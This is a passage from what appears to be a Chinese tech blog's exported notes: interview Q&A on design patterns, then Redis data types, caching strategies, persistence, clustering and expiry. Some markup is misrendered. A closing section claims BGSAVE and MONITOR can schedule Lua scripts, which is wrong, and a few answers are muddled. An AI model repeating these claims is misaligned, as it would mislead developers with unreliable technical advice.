class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">行为型模式重点关注类与类之间的交互与协作。如同在工作中，每个人的行为都可能影响到其他同事，同时每个人也会受到别人的影响。我们一边接收上级的指令，一边派发任务给下级，在这样的协作中完成一项项伟大的工作。程序在运行时，每个对象都不是孤立的，他们可以通过通信与协作完成种种复杂的功能。</span><br><span class="line"></span><br><span class="line">责任链模式：处理职责相同，程度不同的对象，使其在一条链上传递</span><br><span class="line">命令模式：封装“方法调用”，将行为请求者和行为实现者解耦</span><br><span class="line">解释器模式：定义自己的语法规则</span><br><span class="line">迭代器模式：定义 next() 方法和 hasNext() 方法，让外部类使用这两个方法来遍历列表，以达到隐藏列表内部细节的目的</span><br><span class="line">中介者模式：通过引入中介者，将网状耦合结构变成星型结构</span><br><span class="line">备忘录模式：存储对象的状态，以便恢复</span><br><span class="line">观察者模式：处理一对多的依赖关系，被观察的对象改变时，多个观察者都能收到通知</span><br><span class="line">状态模式：关于多态的设计模式，每个状态类处理对象的一种状态</span><br><span class="line">策略模式：殊途同归，用多种方法做同一件事</span><br><span class="line">模板方法模式：关于继承的设计模式，父类是子类的模板</span><br><span class="line">访问者模式：将数据的结构和对数据的操作分离</span><br></pre></td></tr></table></figure><p><strong>责任链模式</strong>：责任链模式：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止<br><strong>观察者模式</strong><br><strong>中介者模式</strong><br><strong>访问者模式</strong><br><strong>解释器模式</strong><br><strong>迭代器模式</strong><br><strong>命令模式</strong><br><strong>备忘录模式</strong></p><h1 id="面试问题"><a href="#面试问题" class="headerlink" title="面试问题"></a>面试问题</h1><ol><li>面向对象的特点是什么？</li></ol><p>👉查看答案👈<br>可维护、可复用、可扩展、灵活性好。</p><ol start="2"><li>让面向对象保持结构良好的秘诀是什么？</li></ol><p>👉查看答案👈<br>让面向对象保持结构良好的秘诀就是设计模式，面向对象结合设计模式，才能真正体会到程序变得可维护、可复用、可扩展、灵活性好。</p><ol start="3"><li>六大设计原则是什么？</li></ol><p>👉查看答案👈<br>开闭原则、单一职责原则、里氏替换原则、依赖倒置原则、迪米特原则、接口隔离原则。</p><ol start="4"><li>什么是里氏替换原则？</li></ol><p>👉查看答案👈<br>子类应该可以完全替换父类。也就是说在使用继承时，只扩展新功能，而不要破坏父类原有的功能。</p><ol start="5"><li>工厂模式是用于达到什么目的的设计模式？</li></ol><p>👉查看答案👈<br>封装对象。</p><ol start="6"><li>工厂模式有哪三种？</li></ol><p>👉查看答案👈<br>简单工厂模式、工厂方法模式、抽象工厂模式。</p><ol start="7"><li>工厂方法模式解决了简单工厂模式的哪两个弊端？</li></ol><p>👉查看答案👈<br>当生产的产品种类越来越多时，工厂类不会变成超级类。工厂类会越来越多，保持灵活。不会越来越大、变得臃肿。如果苹果的生产过程需要修改时，只需修改苹果工厂。梨子的生产过程需要修改时，只需修改梨子工厂。符合单一职责原则。<br>当需要生产新的产品时，无需更改既有的工厂，只需要添加新的工厂即可。保持了面向对象的可扩展性，符合开闭原则。</p><ol start="8"><li>抽象工厂模式是什么样的？</li></ol><p>在创建时指定了具体的工厂类后，在使用时就无需再关心是哪个工厂类，只需要将此工厂当作抽象的 IFactory 接口使用即可。这种经过抽象的工厂方法模式被称作抽象工厂模式。</p><ol><li>抽象工厂模式很好的发挥了哪些原则？</li></ol><p>开闭原则、依赖倒置原则。</p><ol><li>抽象工厂模式的缺点是什么？</li></ol><p>缺点是抽象工厂模式太重了，如果 IFactory 接口需要新增功能，则会影响到所有的具体工厂类。使用抽象工厂模式，替换具体工厂时只需更改一行代码，但要新增抽象方法则需要修改所有的具体工厂类。</p><ol><li>抽象工厂模式适用于和不适用于哪些情况？</li></ol><p>适用于增加同类工厂这样的横向扩展需求，不适合新增功能这样的纵向扩展。</p><ol><li>什么时候可以使用单例模式？</li></ol><p>某个对象全局只需要一个实例时即可。</p><ol><li>单例模式的优点是什么？</li></ol><p>• 它能够避免对象重复创建，节约空间并提升效率<br>• 避免由于操作不同实例导致的逻辑错误</p><ol><li>单例模式有哪两种实现方式？请分别简单解释。</li></ol><p>饿汉式和懒汉式。饿汉式指变量在声明时便初始化。懒汉式指先声明一个空变量，需要用时才初始化。</p><ol><li>饿汉式的弊端是什么？</li></ol><p>即使这个单例不需要使用，它也会在类加载之后立即创建出来，占用一块内存，并增加类初始化时间。</p><ol><li>静态内部类方式是怎么保证线程安全的？</li></ol><p>Java 虚拟机的设计是非常稳定的，早已经考虑到了多线程并发执行的情况。虚拟机在加载类的 clinit 方法时，会保证 clinit 在多线程中被正确的加锁、同步。即使有多个线程同时去初始化一个类，一次也只有一个线程可以执行 clinit 方法，其他线程都需要阻塞等待，从而保证了线程安全。</p><ol><li>建造者模式用于什么时候？</li></ol><p>创建过程稳定，但配置多变的对象。</p><ol><li>建造者模式是什么意思？</li></ol><p>将一个复杂的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。</p><ol><li>现在建造者模式主要用来做什么？</li></ol><p>通过链式调用生成不同的配置。</p><ol><li>使用建造者模式的好处是什么？</li></ol><p>不用担心忘了指定某个配置，保证了构建过程是稳定的。</p><ol><li>原型模式是什么？</li></ol><p>用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。</p><ol><li>适配器模式适用于什么结构？</li></ol><p>有相关性但不兼容的结构。</p><ol><li>什么是适配？什么是适配器？</li></ol><p>源接口通过一个中间件转换后才可以适用于目标接口，这个转换过程就是适配，这个中间件就称之为适配器。</p><ol><li>需要绘制矩形、圆形、三角形这三种图案，按照桥接模式的思想会怎么做？</li></ol><p>将形状和颜色分离，根据需要对形状和颜色进行组合。</p><ol><li>什么是桥接模式？</li></ol><p>将抽象部分与它的实现部分分离，使它们都可以独立地变化。它是一种对象结构型模式，又称为柄体模式或接口模式。</p><ol><li>组合模式适用于什么结构？</li></ol><p>组合模式用于整体与部分的结构，当整体与部分有相似的结构，在操作时可以被一致对待时，就可以使用组合模式。</p><ol><li>组合模式最主要的功能是什么？</li></ol><p>组合模式最主要的功能是让用户可以一致对待整体和部分结构，将两者都作为一个相同的组件。</p><ol><li>什么是组合模式中的透明方式？</li></ol><p>违背了接口隔离原则的组合模式。</p><ol><li>什么是安全方式？</li></ol><p>在 Component 中不声明 add 和 remove 等管理子对象的方法，这样叶节点就无需实现它，只需在枝节点中实现管理子对象的方法即可。</p><ol><li>什么是透明装饰模式？</li></ol><p>装饰器仅用于增强功能，并不会改变 Me 原有的功能，这种装饰模式称之为透明装饰模式。</p><ol><li>装饰模式的缺点是什么？</li></ol><p>容易造成程序中有大量相似的类。</p><ol><li>动态代理相对于静态代理的优势是什么？</li></ol><p>节省代码量。</p><ol><li>简述责任链模式的有优点有哪些？</li></ol><p>• 降低了对象之间的耦合度。<br>• 扩展性强，满足开闭原则。可以根据需要增加新的请求处理类。<br>• 灵活性强。可以动态地改变链内的成员或者改变链的次序来适应流程的变化。<br>• 简化了对象之间的连接。每个对象只需保持一个指向其后继者的引用。</p><ol><li>什么是宏命令？</li></ol><p>宏命令是将多个命令合并起来组成的命令。</p><ol><li>请写出解释器模式的一个常见应用。</li></ol><p>在我们平时匹配字符串时，用到的正则表达式就是一个解释器。</p><ol><li>怎样使得外部类只能读取此列表中的数据，无法修改其中的任何数据，保证其安全性？</li></ol><p>• 提供一个 String next() 方法，使得外部类可以按照次序，一条一条的读取数据；<br>• 提供一个 boolean hasNext() 方法，告知外部类是否还有下一条数据。</p>]]></content>
      
      
      <categories>
          
          <category> 软件工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> 设计模式 </tag>
            
            <tag> UML </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis questions</title>
      <link href="/2023/01/04/2023-01-04-%E9%9D%A2%E7%BB%8FRedis%E9%97%AE%E9%A2%98/"/>
      <url>/2023/01/04/2023-01-04-%E9%9D%A2%E7%BB%8FRedis%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p> questions</p><a id="more"></a><h2 id="1-memcached和redis区别有哪些，优势劣势？"><a href="#1-memcached和redis区别有哪些，优势劣势？" class="headerlink" title="1.memcached和redis区别有哪些，优势劣势？"></a>1.memcached和redis区别有哪些，优势劣势？</h2><p>redis支持多种数据类型，并且支持持久化策略，</p><h2 id="2-实现本地缓存，有哪些方案？go本地，redis"><a href="#2-实现本地缓存，有哪些方案？go本地，redis" class="headerlink" title="2.实现本地缓存，有哪些方案？go本地，redis"></a>2.实现本地缓存，有哪些方案？go本地，redis</h2><h2 id="3-redis通讯协议？特点是什么"><a href="#3-redis通讯协议？特点是什么" class="headerlink" title="3.redis通讯协议？特点是什么"></a>3.redis通讯协议？特点是什么</h2><h2 id="4-字符串最大长度是多少？512MB"><a href="#4-字符串最大长度是多少？512MB" class="headerlink" title="4.字符串最大长度是多少？512MB"></a>4.字符串最大长度是多少？512MB</h2><h2 id="5-介绍一下zset及底层实现机制"><a href="#5-介绍一下zset及底层实现机制" class="headerlink" title="5.介绍一下zset及底层实现机制"></a>5.介绍一下zset及底层实现机制</h2><h2 id="6-redis事务？原理是什么"><a href="#6-redis事务？原理是什么" class="headerlink" title="6.redis事务？原理是什么"></a>6.redis事务？原理是什么</h2><h2 id="7-事务相关命令？支持回滚吗"><a href="#7-事务相关命令？支持回滚吗" class="headerlink" title="7.事务相关命令？支持回滚吗"></a>7.事务相关命令？支持回滚吗</h2><h2 id="8-介绍一下pipeline和使用场景：批量读取写入"><a href="#8-介绍一下pipeline和使用场景：批量读取写入" class="headerlink" title="8.介绍一下pipeline和使用场景：批量读取写入"></a>8.介绍一下pipeline和使用场景：批量读取写入</h2><p>批量执行Redis命令的机制，它可以在客户端发送多个命令后，一次性将它们发送到服务器，然后一次性接收服务器的响应</p><h3 id="和批量命令有什么不同"><a href="#和批量命令有什么不同" class="headerlink" title="和批量命令有什么不同"></a>和批量命令有什么不同</h3><ol><li>pipeline是同时发送/执行不同命令的机制，批量是都需要执行相似的</li><li>pipeline是顺序执行所有命令，执行一个一个状态，而批量需要等待所有的返回<h2 id="9-设置生存时间和过期时间用什么命令"><a href="#9-设置生存时间和过期时间用什么命令" class="headerlink" title="9.设置生存时间和过期时间用什么命令"></a>9.设置生存时间和过期时间用什么命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXPIRE key n_seconds</span><br><span class="line">PEXPIRE mykey n_milseconds</span><br></pre></td></tr></table></figure></li></ol><h2 id="10-介绍下redis的发布订阅功能"><a href="#10-介绍下redis的发布订阅功能" class="headerlink" title="10.介绍下redis的发布订阅功能"></a>10.介绍下redis的发布订阅功能</h2><ul><li>允许多个客户端之间通过消息中间件来发送和接收消息。在这种模式下，消息的发送者称为发布者（Publisher），而消息的接收者称为订阅者（Subscriber）</li><li>Redis的发布订阅功能是异步的，消息的发送和接收是非阻塞的，因此在订阅者接收消息时需要特别注意处理并发和同步的问题。<h2 id="11-redis单线程为什么那么快"><a href="#11-redis单线程为什么那么快" class="headerlink" title="11.redis单线程为什么那么快"></a>11.redis单线程为什么那么快</h2>单线程没有锁，主线程异步处理IO，避免多线程上下文切换<h2 id="12-分布式缓存要注意哪些问题"><a href="#12-分布式缓存要注意哪些问题" class="headerlink" title="12. 分布式缓存要注意哪些问题"></a>12. 分布式缓存要注意哪些问题</h2></li></ul><ol><li>缓存一致性 </li><li>缓存击穿 </li><li>缓存雪崩</li></ol><h2 id="13-redis的key删除策略"><a href="#13-redis的key删除策略" class="headerlink" title="13. redis的key删除策略"></a>13. redis的key删除策略</h2><ol><li>定期删除，每 100 毫秒检查 20 个随机选择的过期 key，如果发现有过期的 key，就会将其删除。</li><li>惰性删除，<br>设置过期时间+一个随机的时间，防止缓存雪崩</li></ol>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis</title>
      <link href="/2023/01/04/2023-01-04-%E9%9D%A2%E7%BB%8FRedis/"/>
      <url>/2023/01/04/2023-01-04-%E9%9D%A2%E7%BB%8FRedis/</url>
      
        <content type="html"><![CDATA[<p> questions</p><a id="more"></a><h1 id="Redis数据类型"><a href="#Redis数据类型" class="headerlink" title="Redis数据类型"></a>Redis数据类型</h1><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="https://cdn.xiaolincoding.com/gh/xiaolincoder/redis/八股文/五种数据类型.png" alt title>                </div>                <div class="image-caption"></div>            </figure><table><thead><tr><th>String</th><th>List</th><th>Hash</th><th>Set</th><th>Zset</th></tr></thead><tbody><tr><td>SDS</td><td>LinkedList/ZipList/QuickList</td><td>Dict、ZipList</td><td>Dict、Intset</td><td>ZipList、SkipList</td></tr><tr><td># redis内存模型？</td><td></td><td></td><td></td><td></td></tr><tr><td>hashtable</td><td></td><td></td><td></td><td></td></tr></tbody></table><h1 id="特殊数据类型"><a href="#特殊数据类型" class="headerlink" title="特殊数据类型"></a>特殊数据类型</h1><ul><li>BitMap：签到、行为统计（点赞）</li><li>hyperloglog：不太了解</li><li>Geospatial：基于sort set，GEO 中存储的地理位置信息的经纬度数据通过 GeoHash 算法转换成了一个整数，这个整数作为 Sorted Set 的 score(权重参数)使用。<h2 id="【重点】一致性问题：Redis和数据库的一致性"><a href="#【重点】一致性问题：Redis和数据库的一致性" class="headerlink" title="【重点】一致性问题：Redis和数据库的一致性"></a>【重点】一致性问题：Redis和数据库的一致性</h2><a href="https://juejin.cn/post/7287026079066800168#heading-1" target="_blank" rel="noopener">https://juejin.cn/post/7287026079066800168#heading-1</a></li></ul><h1 id="三种缓存读写策略"><a href="#三种缓存读写策略" class="headerlink" title="三种缓存读写策略"></a>三种缓存读写策略</h1><h2 id="1-Cache-Aside-Pattern（旁路缓存模式）"><a href="#1-Cache-Aside-Pattern（旁路缓存模式）" class="headerlink" title="1. Cache Aside Pattern（旁路缓存模式）"></a>1. <strong>Cache Aside Pattern（旁路缓存模式）</strong></h2><ul><li>写：先更新DB，再删除cache</li><li>读：先从cache读，读到就返回；读不到就读db，将数据写到cache<h3 id="【问题】可以先删cache，再更新db吗？"><a href="#【问题】可以先删cache，再更新db吗？" class="headerlink" title="【问题】可以先删cache，再更新db吗？"></a>【问题】可以先删cache，再更新db吗？</h3>不能，因为写的时间远大于读，出现数据不一致（和缓存击穿？）的可能性更高<h3 id="缺陷有哪些"><a href="#缺陷有哪些" class="headerlink" title="缺陷有哪些"></a>缺陷有哪些</h3><ol><li>数据不在cache，导致缓存击穿（大量数据访问db）</li><li>不适合写操作频繁的操作<h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3>解决办法：</li></ol><ul><li>数据库和缓存数据强一致场景：更新 db 的时候同样更新 cache，不过我们需要加一个锁/分布式锁来保证更新 cache 的时候不存在线程安全问题。</li><li>可以短暂地允许数据库和缓存数据不一致的场景：更新 db 的时候同样更新 cache，但是给缓存加一个比较短的过期时间，这样的话就可以保证即使数据不一致的话影响也比较小</li></ul></li></ul><h2 id="2-Read-Write-Through-Pattern（读写穿透）"><a href="#2-Read-Write-Through-Pattern（读写穿透）" class="headerlink" title="2. Read/Write Through Pattern（读写穿透）"></a>2. <strong>Read/Write Through Pattern（读写穿透）</strong></h2><ul><li>写：先查cache，没有就直接更新db；有的话， 先更新cache，cache服务自己更新db</li><li>读：先从cache读，读到就返回；读不到就读db，写入到cache<h2 id="3-Write-Behind-Pattern（异步缓存写入）"><a href="#3-Write-Behind-Pattern（异步缓存写入）" class="headerlink" title="3. Write Behind Pattern（异步缓存写入）"></a>3. <strong>Write Behind Pattern（异步缓存写入）</strong></h2></li><li>写：先查cache，没有直接更新db；有的话，只更新缓存，异步批量写db</li><li>读：先从cache读，读到就返回；读不到就读db，写入到cache<br><strong>与读写穿透的区别：</strong>：Read/Write Through 是同步更新 cache 和 db，而 Write Behind 则是只更新缓存，不直接更新 db，而是改为异步批量的方式来更新 db。<h1 id="Redis持久化"><a href="#Redis持久化" class="headerlink" title="Redis持久化"></a>Redis持久化</h1></li></ul><h2 id="Redis持久化的方式"><a href="#Redis持久化的方式" class="headerlink" title="Redis持久化的方式"></a>Redis持久化的方式</h2><p>Redis 共有三种数据持久化的方式：</p><ul><li>AOF（Append Only File）日志：每执行一条写操作命令，就把该命令以追加的方式写入到一个文件里；</li><li>RDB（Redis Database Backup file） 快照：将某一时刻的内存数据，以二进制的方式写入磁盘；</li><li>混合持久化方式：Redis 4.0 新增的方式，集成了 AOF 和 RBD 的优点<h3 id="RDB快照"><a href="#RDB快照" class="headerlink" title="RDB快照"></a>RDB快照</h3>提供两个命令实现快照</li><li>save：在主线程实现，可能会导致阻塞</li><li>bgsave：background save，在后台的子进程生成RDB快照</li></ul><p><strong>RDB 在执行快照的时候，数据能修改吗？</strong></p><p>执行 bgsave 过程中，Redis 依然可以继续处理操作命令的，也就是数据是能被修改的，关键的技术就在于【写时复制技术】（Copy-On-Write, COW）。</p><p>技术原理：bgsave会通过 fork() 创建子进程，此时子进程和父进程是共享同一片内存数据的，因为创建子进程的时候，会复制父进程的页表，但是页表指向的物理内存还是一个，此时如果主线程执行读操作，则主线程和 bgsave 子进程互相不影响。</p><h3 id="AOF日志"><a href="#AOF日志" class="headerlink" title="AOF日志"></a>AOF日志</h3><p>在执行完一条写操作命令后，就会把该命令以追加的方式写入到一个文件里，然后 Redis 重启时，会读取该文件记录的命令，然后逐一执行命令的方式来进行数据恢复。<br><strong>它们的区别是什么</strong><br>AOF：三种写回方式</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/images/redisAOF.webp" alt title>                </div>                <div class="image-caption"></div>            </figure><p>所以，RDB 快照就是记录某一个瞬间的内存数据，记录的是实际数据，而 AOF 文件记录的是命令操作的日志，而不是实际的数据。</p><p>因此在 Redis 恢复数据时， RDB 恢复数据的效率会比 AOF 高些，因为直接将 RDB 文件读入内存就可以，不需要像 AOF 那样还需要额外执行操作命令的步骤才能恢复数据。</p><p><strong>AOF 日志过大，会触发什么机制</strong></p><p>【AOF 重写机制】，压缩AOF文件：<br>【压缩方式】：在重写时，读取当前数据库中的所有键值对，然后将每一个键值对用一条命令记录到「新的 AOF 文件」，等到全部记录完后，就将新的 AOF 文件替换掉现有的 AOF 文件。但是对KV的记录就保持最新的那一条</p><h1 id="redis事务【不建议开发时使用，和mysql不一致的时候会造成缓存读写的限制问题】"><a href="#redis事务【不建议开发时使用，和mysql不一致的时候会造成缓存读写的限制问题】" class="headerlink" title="redis事务【不建议开发时使用，和mysql不一致的时候会造成缓存读写的限制问题】"></a>redis事务【不建议开发时使用，和mysql不一致的时候会造成缓存读写的限制问题】</h1><p><strong>不支持回滚</strong></p><ol><li>ULTI/EXEC 命令：<br>在 Redis 中，事务的开始由 MULTI 命令表示，结束由 EXEC 命令表示。在 MULTI 和 EXEC 之间的所有命令会被添加到事务队列中，但不会立即执行。</li><li>WATCH 命令：<br>Redis 提供了 WATCH 命令，可以用于在事务执行之前监视一个或多个键。如果在事务执行过程中，被监视的键被其他客户端修改了，事务将会被打断。</li></ol><h1 id="数据类型实现"><a href="#数据类型实现" class="headerlink" title="数据类型实现"></a>数据类型实现</h1><h3 id="String-字符串-应用场景-缓存对象、常规计数、分布式锁、共享-session-信息等。"><a href="#String-字符串-应用场景-缓存对象、常规计数、分布式锁、共享-session-信息等。" class="headerlink" title="String(字符串) 应用场景:缓存对象、常规计数、分布式锁、共享 session 信息等。"></a>String(字符串) 应用场景:缓存对象、常规计数、分布式锁、共享 session 信息等。</h3><ul><li><strong>底层数据结构是SDS（Simple Dynamic String）简单动态字符串</strong>，保存文本数据，还可以保存二进制数据 。因为 SDS 使用 len 属性 的值而不是空字符来判断字符串是否结束，并且 SDS 的所有 API 都会以处理二进制的方式来处理 SDS 存放在 buf[] 数组里的数据。所以 SDS 不光能存放文本数据，而且能保存图片、音频、视频、压缩文件这样的二进制数据。</li><li>Redis 的 SDS API 是安全的，<strong>拼接字符串不会造成缓冲区溢出</strong> ：因为 SDS 在拼接字符串之前会检查 SDS 空间是否满足要求，如果<strong>空间不够会自动扩容</strong>，所以不会导致缓冲区溢出的问题。</li></ul><p><strong>使用 String 来缓存对象有两种方式</strong>：</p><p>直接缓存整个对象的 JSON，命令例子： <figure class="highlight plain"><figcaption><span>user:1 '&#123;"name":"xiaolin", "age":18&#125;'```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">采用将 key 进行分离为 user:ID:属性，采用 MSET 存储，用 MGET 获取各属性值，命令例子： MSET user:1:name xiaolin user:1:age 18 user:2:name xiaomei user:2:age 20**</span><br><span class="line">### List(列表)</span><br><span class="line">- **数据结构**：quicklist（双向链表+压缩列表）</span><br><span class="line">- **类型的应用场景**:消息队列(但是有两个问题:1. 生产者需要自行实现全局唯一ID;2. 不能以消费组形式消费数据)等</span><br><span class="line"></span><br><span class="line">**List 可以使用 LPUSH + RPOP （或者反过来，RPUSH+LPOP）命令实现消息队列。**</span><br><span class="line"></span><br><span class="line">- 生产者使用 LPUSH key value[value...] 将消息插入到队列的头部，如果 key 不存在则会创建一个空的队列再插入消息。</span><br><span class="line">  </span><br><span class="line">- 消费者使用 RPOP key 依次读取队列的消息，先进先出。</span><br><span class="line"></span><br><span class="line">### Set(集合) 类型:聚合计算(并集、交集、差集)场景，比如点赞、共同关注、抽奖活动等。</span><br><span class="line">- **数据结构**：是由哈希表或整数集合实现的</span><br><span class="line">- 如果集合中的元素都是整数且元素个数小于 512 （默认值，set-maxintset-entries配置）个，Redis 会使用整数集合作为 Set 类型的底层数据结构；</span><br><span class="line">- 如果集合中的元素不满足上面条件，则 Redis 使用哈希表作为 Set 类型的底层数据结构。</span><br><span class="line">### Zset(有序集合) 类型:排序场景，比如排行榜、电话和姓名排序等</span><br><span class="line">- **数据结构** ：7.0以后，使用 **listpack** 数据结构</span><br><span class="line">### Hash(哈希) 类型:缓存对象、购物车等。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### BitMap(2.2 版新增):二值状态统计的场景，比如签到、判断用户登陆状态、 连续签到用户总数等;</span><br><span class="line">### HyperLogLog(2.8 版新增):海量数据基数统计的场景，比如百万级网页 UV 计数等;</span><br><span class="line">### GEO</span><br><span class="line">### Stream</span><br><span class="line"># Redis 的线程模型</span><br><span class="line"></span><br><span class="line">**首先**，是单线程模型，它指的是```「接收客户端请求-&gt;解析请求 -&gt;进行数据读写等操作-&gt;发送数据给客户端」```这个过程是由一个线程（主线程）来完成的，这也是我们常说 Redis 是单线程的原因。</span><br><span class="line"></span><br><span class="line">但是，Redis 程序并不是单线程的，Redis 在启动的时候，是会启动后台线程（BIO）</span><br><span class="line"></span><br><span class="line">### Redis 6.0 之后为什么引入了多线程？</span><br><span class="line">回答：网络IO出现瓶颈，对网络IO引入了多线程处理，命令执行仍然是主线程完成。</span><br><span class="line"></span><br><span class="line">虽然 Redis 的主要工作（网络 I/O 和执行命令）一直是单线程模型，但是在 Redis 6.0 版本之后，也采用了多个 I/O 线程来处理网络请求，这是因为```随着网络硬件的性能提升，Redis 的性能瓶颈有时会出现在网络 I/O 的处理上```。</span><br><span class="line"></span><br><span class="line">所以为了提高网络 I/O 的并行度，Redis 6.0 **对于网络 I/O 采用多线程来处理**。但是对于命令的执行，Redis 仍然使用单线程来处理，所以大家不要误解 Redis 有多线程同时执行命令。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### Redis的零拷贝技术是什么</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># Redis集群</span><br><span class="line"></span><br><span class="line"> 主从复制，主节点故障时要手动恢复</span><br><span class="line">### 主从模式</span><br><span class="line">读写分离，主节点负责写，从节点负责读。</span><br><span class="line">### 哨兵模式</span><br><span class="line">多个哨兵监控主节点服务器，提供故障转移功能：</span><br><span class="line">【故障转移】：主节点挂了之后，在从节点中选取一个作为主节点</span><br><span class="line"></span><br><span class="line">### 切片集群模式</span><br><span class="line">缓存数据量大到一台服务器无法缓存时，就需要使用 Redis 切片集群。</span><br><span class="line">将数据分布在不同的服务器上，以此来降低系统对单主节点的依赖，从而提高 Redis 服务的读写性能。</span><br><span class="line">- 切片就是一个redis实例分成多个hash slot，这些哈希槽类似于数据分区，每个键值对都会根据它的 key，被映射到一个哈希槽中。</span><br><span class="line">- 默认部署的slot个数有16384个，平均分配到各节点上，如果有n个redis实例，那么每个节点有16384/n个slot。</span><br><span class="line"></span><br><span class="line">### 可能出现的问题：</span><br><span class="line">**集群脑裂是什么**：</span><br><span class="line"></span><br><span class="line">由于网络问题，导致主节点与哨兵失联后，哨兵多选举出来一个主节点，当旧节点恢复正常时，降级从节点后，向新master请求同步复制时，清空了自己的缓冲区，产生了之前客户端写入的数据丢失的问题。</span><br><span class="line"></span><br><span class="line">- 如果旧节点又好了，就把旧主节点降级为普通节点，作为从节点向新master进行同步复制的时候，由于会从节点会清空自己的缓冲区，所以导致之前客户端写入的数据丢失了。</span><br><span class="line"></span><br><span class="line">【解决方案】</span><br><span class="line">当主节点发现从节点下线或者通信超时的总数量小于阈值时，那么禁止主节点进行写数据，直接把错误返回给客户端。</span><br><span class="line"></span><br><span class="line">【配置文件】</span><br><span class="line">- min-slaves-to-write x，主节点必须要有至少 x 个从节点连接，如果小于这个数，主节点会禁止写数据。</span><br><span class="line">- min-slaves-max-lag x，主从数据复制和同步的延迟不能超过 x 秒，如果超过，主节点会禁止写数据。</span><br><span class="line">### Redis过期删除与内存淘汰</span><br><span class="line"></span><br><span class="line">【过期删除：惰性删除+定期删除】当我们对一个 key 设置了过期时间时，Redis 会把该 key 带上过期时间存储到一个过期字典（expires dict）中，也就是说「过期字典」保存了数据库中所有 key 的过期时间。</span><br><span class="line"></span><br><span class="line">- 惰性删除：惰性删除策略的做法是，不主动删除过期键，每次从数据库访问 key 时，都检测 key 是否过期，如果过期则删除该 key。</span><br><span class="line">- 每隔一段时间「随机」从数据库中取出一定数量的 key 进行检查，并删除其中的过期key。</span><br><span class="line">【内存淘汰：不进行数据淘汰的策略/进行数据淘汰的策略】</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 集群与哨兵模式的区别</span><br><span class="line">- 主从集群模式适合对读写性能要求高，且可以容忍一定程度的数据同步延迟的场景</span><br><span class="line">- 哨兵模式适用于对高可用性要求较高的场景，能够实现自动故障切换</span><br><span class="line">## Redis的lua支持</span><br><span class="line">如果你想在 Redis 中定时执行 Lua 脚本，可以考虑使用 Redis 的定时任务功能，例如使用 Redis 的BGSAVE和MONITOR命令配合实现。</span><br><span class="line"></span><br><span class="line">1. 编写 Lua 脚本</span><br><span class="line">首先，你需要编写一个 Lua 脚本，命名为 a.lua 或其他你喜欢的名字。在该脚本中编写你想要定时执行的逻辑。</span><br><span class="line">2. 使用 BGSAVE</span><br><span class="line">Redis 的 BGSAVE 命令用于在后台执行持久化操作（将数据写入磁盘），这会创建一个快照文件。你可以利用这个特性来触发 Lua 脚本的执行。</span><br><span class="line">客户端执行```BGSAVE</span><br></pre></td></tr></table></figure></p><p>请注意，BGSAVE 不会阻塞 Redis 的主线程，因此可以在 Redis 运行时执行。</p><ol start="3"><li>使用 MONITOR<br>Redis 的 MONITOR 命令可以用于实时监控 Redis 的命令执行情况。你可以通过监控 Redis 的命令来捕捉 BGSAVE 命令的执行，一旦发现 BGSAVE 命令执行完毕，就可以在 Lua 脚本中调用 EVAL 来执行你的逻辑。</li></ol><h1 id="Redis缓存"><a 